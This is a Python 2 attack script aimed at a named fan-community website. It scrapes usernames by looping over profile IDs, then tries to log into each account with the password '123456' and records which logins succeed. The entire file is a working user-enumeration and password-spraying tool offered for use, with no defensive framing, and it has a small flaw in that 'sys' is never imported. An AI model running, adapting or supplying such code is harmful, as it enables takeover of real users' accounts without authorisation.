#!/usr/bin/env python

# charlie_pwniels_band.py
# by dual
#
# http://www.charliedanielssoapbox.com/view_user.php?id=XXXX
# "/pm.php?send_to=littleone"
#
# range(1,5001)
# file = urllib.urlopen("http://www.charliedanielssoapbox.com/view_user.php?id=" + str(i))

import httplib, random, re, time, urllib

# POST function
def post(USERNAME):
    # Debug user name
    #print USERNAME
    params = urllib.urlencode({'referrer': "http%3A%2F%2Fwww.charliedanielssoapbox.com&login=&user_name=str(USERNAME)&user_password=123456&login=Login",
                           'user_name': USERNAME,
                           'user_password': "123456",
                           'login': "Login"})

    headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
    conn = httplib.HTTPConnection("www.charliedanielssoapbox.com:80")
    conn.request("POST", "/login.php", params, headers)
    response = conn.getresponse()

    # Debug response
    #print response.status, response.reason

    if   response.status == 200:
          print "FAIL\n"
          results.write("FAIL\n")
    elif response.status == 302:
          print "123456 FTW!\n"
          results.write("123456 FTW!\n")
    else:
          print "Unknown response: ", response.status
          results.write("Unknown response\n")

    # Debug data
    #data = response.read()

    conn.close()

# Generate and shuffle user IDs
user_ids = list(range(1000, 6001))
#print user_ids
random.shuffle(user_ids)

# Debug user IDs
#print user_ids
#print user_ids[0]

# Open results file
try:
    results = open("results.txt", "w")
except(IOError), error:
    print "Could not open results.txt:\n", error
    print "Exiting..."
    sys.exit()

# Iterate through user IDs and GET user name
for user in user_ids:
    page = urllib.urlopen("http://www.charliedanielssoapbox.com/view_user.php?id=" + str(user))
    content = page.read()
    page.close()
    match = re.search('pm.php\?send_to=(.*)"', content)
    if match:
        if (re.search('[a-zA-Z]', match.group(1))):
            print match.group(1)
            results.write(match.group(1))
            results.write(": ")
            post(match.group(1))
    time.sleep(1)

results.close()

# Debug GET request
#print content
